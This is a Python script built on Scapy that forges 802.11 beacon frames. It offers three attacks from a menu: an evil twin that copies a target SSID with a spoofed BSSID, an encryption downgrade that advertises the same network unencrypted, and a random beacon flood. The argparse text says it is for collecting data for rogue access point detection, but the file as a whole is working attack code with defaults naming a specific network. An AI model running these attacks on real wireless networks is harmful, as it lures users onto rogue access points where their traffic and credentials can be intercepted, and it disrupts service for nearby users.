import time
import argparse
from scapy.all import *
from threading import Thread

# === CONFIGURATION ===
# Default values, can be overridden by arguments
DEFAULT_INTERFACE = "wlan0"
DEFAULT_TARGET_SSID = "Satz"
DEFAULT_REAL_BSSID = "10:27:F5:5C:C6:A3"
FAKE_BSSID = "10:27:F5:5C:C6:B4" 

def create_beacon(ssid, bssid, channel=1, encryption=True):
    # 1. RadioTap Header
    radio = RadioTap()
    
    # 2. Dot11 Header (Type=0/8 for Beacon)
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
    
    # 3. Beacon Layer
    beacon = Dot11Beacon(cap="ESS+privacy" if encryption else "ESS")
    
    # 4. Information Elements (IEs)
    # SSID
    ie_ssid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    
    # Supported Rates
    ie_rates = Dot11Elt(ID="Rates", info='\x82\x84\x8b\x96\x24\x30\x48\x6c')
    
    # Channel
    ie_channel = Dot11Elt(ID="DSset", info=chr(channel))
    
    # RSN (WPA2) - Only if encryption is on
    rsn_part = b''
    if encryption:
        # Standard WPA2 IE
        rsn_part = Dot11Elt(ID=48, info=b'\x01\x00' \
                            b'\x00\x0f\xac\x04' \
                            b'\x02\x00' \
                            b'\x00\x0f\xac\x04' \
                            b'\x00\x0f\xac\x02' \
                            b'\x01\x00')
    
    # Stack it all together
    frame = radio / dot11 / beacon / ie_ssid / ie_rates / ie_channel
    if encryption:
        frame = frame / rsn_part
        
    return frame

def attack_evil_twin(interface, ssid, bssid):
    print(f"[*] Starting EVIL TWIN Attack: SSID={ssid} | BSSID={bssid}")
    frame = create_beacon(ssid, bssid, channel=6, encryption=True)
    
    print("Press CTRL+C to stop...")
    while True:
        try:
            sendp(frame, iface=interface, verbose=0, inter=0.100) # 100ms interval
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error sending packet: {e}")
            time.sleep(1)

def attack_downgrade(interface, ssid):
    print(f"[*] Starting ENCRYPTION DOWNGRADE Attack: SSID={ssid}")
    # Same SSID, Same (or similar) BSSID, but NO ENCRYPTION
    # We use a randomized BSSID to avoid conflict with the real one, 
    # but close enough to look suspicious if analyzed purely by SSID
    fake_bssid = "00:11:22:33:44:55"
    frame = create_beacon(ssid, fake_bssid, channel=6, encryption=False)
    
    print("Press CTRL+C to stop...")
    while True:
        try:
            sendp(frame, iface=interface, verbose=0, inter=0.100)
        except KeyboardInterrupt:
            break

def attack_flood(interface):
    print(f"[*] Starting BEACON FLOOD (Random SSIDs)")
    print("Press CTRL+C to stop...")
    while True:
        try:
            # Generate random SSID and BSSID
            rand_ssid = f"FreeWiFi_{RandNum(1000,9999)}"
            rand_bssid = RandMAC()
            
            frame = create_beacon(rand_ssid, rand_bssid, channel=1, encryption=False)
            sendp(frame, iface=interface, verbose=0, count=1)
            time.sleep(0.01) # Fast flood
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Rogue AP Generator for Dataset Collection')
    parser.add_argument('-i', '--interface', default=DEFAULT_INTERFACE, help='Monitor mode interface (default: wlan0)')
    parser.add_argument('-s', '--ssid', default=DEFAULT_TARGET_SSID, help=f'Target SSID (default: {DEFAULT_TARGET_SSID})')
    parser.add_argument('-b', '--bssid', default=FAKE_BSSID, help=f'Fake BSSID to use (default: {FAKE_BSSID})')
    
    print("Select Attack Type:")
    print("1. Evil Twin (Targeted - same SSID, diff BSSID)")
    print("2. Encryption Downgrade (Targeted - same SSID, no encryption)")
    print("3. Random Beacon Flood (Noise generation)")
    
    try:
        choice = input("Enter choice (1-3): ")
        args = parser.parse_args()
        
        if choice == "1":
            attack_evil_twin(args.interface, args.ssid, args.bssid)
        elif choice == "2":
            attack_downgrade(args.interface, args.ssid)
        elif choice == "3":
            attack_flood(args.interface)
        else:
            print("Invalid choice.")
    except KeyboardInterrupt:
        print("\nExiting...")
